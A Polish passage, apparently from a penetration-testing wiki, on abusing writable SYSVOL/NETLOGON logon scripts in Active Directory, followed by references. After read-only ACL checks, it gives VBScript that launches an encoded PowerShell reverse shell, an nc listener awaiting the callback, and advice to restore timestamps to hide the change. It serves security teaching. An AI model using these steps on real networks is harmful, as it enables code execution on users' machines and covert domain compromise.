Zautomatyzowane narzędzia mogą pokazywać SYSVOL/NETLOGON jako tylko do odczytu, nawet jeśli dokładny skrypt ma inną listę ACL NTFS. Zacznij od inspekcji tego pliku i jego katalogu nadrzędnego w trybie tylko do odczytu; pasujące wpisy Allow ACE nadal są kandydatami, ponieważ znaczenie mają efektywny dostęp SMB i NTFS, wpisy Deny ACE oraz bieżący token:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Autoryzowany test zapisu powinien być ukierunkowany na konkretny cel i odwracalny, a oryginalny skrypt należy wcześniej skopiować i przywrócić po teście. Nie nadpisuj działającego skryptu logowania wyłącznie po to, by przetestować dostęp — udany zapis może spowodować jego uruchomienie przy następnym logowaniu użytkownika.

### Zatruj skrypt logowania VBScript, aby uzyskać RCE
Dodaj polecenie uruchamiające PowerShell reverse shell (wygeneruj go na revshells.com) i zachowaj oryginalną logikę, aby nie zakłócić działania firmy:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Nasłuchuj na swoim hoście i czekaj na następne interaktywne logowanie:

```bash
rlwrap -cAr nc -lnvp 443
```

Uwagi:
- Wykonywanie odbywa się z tokenem użytkownika odpowiedzialnego za logowanie (nie SYSTEM). Zakres obejmuje link GPO (OU, witryna, domena), który stosuje ten skrypt.
- Po użyciu przywróć oryginalną zawartość i sygnatury czasowe.


## References

- [1] [Nadużywanie ACL/ACE w Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Konta uprzywilejowane i uprawnienia tokenów](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – aktualizacja ścieżek ataku ACL](https://wald0.com/?p=112)
- [4] [Wyliczenie ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacja uprawnień za pomocą ACL w Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skanowanie uprawnień Active Directory i kont uprzywilejowanych](https://adsecurity.org/?p=3658)
- [7] [Konstruktor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operacje na atrybutach AD/UAC z poziomu Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (członkostwo w grupie)](https://www.samba.org/)
- [10] [HTB Puppy: nadużywanie ACL w AD, łamanie Argon2 w KeePassXC i odszyfrowywanie DPAPI w celu uzyskania uprawnień administratora DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: przejmowanie ścieżek UNC GPO w celu wykonania kodu i przekazywania NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: wykorzystywanie GPO w Active Directory za pomocą przekazywania NTLM i nie tylko](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU się śmieje? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: wykorzystywanie ukrytych wektorów ataku ACL jednostek organizacyjnych w Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Symulowanie legalnych usług Active Directory w sieci: przypadek wykorzystania GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
